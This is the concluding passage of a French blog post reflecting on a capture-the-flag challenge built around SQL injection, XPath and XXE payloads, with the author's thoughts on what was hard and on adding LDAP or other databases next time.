J'ai trouvé ce challenge intéréssant mais aussi amusant, c'est purement ce que j'aime dans des challenges : Avoir un puzzle à résoudre plus qu'un concours de connaissance.
Bien sûr, ici, il me manquait des infos, notamment le `?` qui donne `NULL` en SQLi ou alors le fonctionnement de la Xpath ultra réduite. Mais j'ose croire qu'avec plus de temps (et de la doc), je serai venu à bout de ce challenge, même sans avoir la payload la plus courte.

J'ai pu discuter un peu avec BitK et d'autre participants, et il en est ressorti que l'ajout de la XXE était clairement la plus compliquée. Et une quesiton en est sortie "Quels payload/Challenges pourrait-on rajouter ?".
Je pense qu'essayer de jouer sur plusieurs DBMS et rajouter du LDAP serait quelque chose de faisable et d'intéréssant, qui sait ? Pour la prochaine année !


---

> Auteur: [Driikolu](https://x.com/driikolu)  
> URL: https://driikolu.fr/posts/payload-plz/  

